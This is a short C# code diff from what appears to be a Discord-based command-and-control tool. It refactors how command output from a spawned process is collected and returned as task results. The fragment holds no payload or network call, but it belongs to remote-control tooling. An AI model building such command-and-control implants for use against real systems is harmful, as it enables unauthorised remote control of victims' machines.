@@ -73,14 +73,9 @@ namespace DiscordC2;
                 using var reader = process!.StandardOutput;
                 process.EnableRaisingEvents = true;
 
-                var lineData = await reader.ReadToEndAsync();
-                var items = lineData.Split(new[] { Environment.NewLine });
-                StringBuilder builder = new();
-                foreach (var item in items) {
-                    builder.AppendLine(item);
-                }
+                string STaskResults = await reader.ReadToEndAsync();
 
-                return (true, builder.ToString(), null)!;
+                return (true, STaskResults, null)!;
             }
             catch (Exception localException)
             {
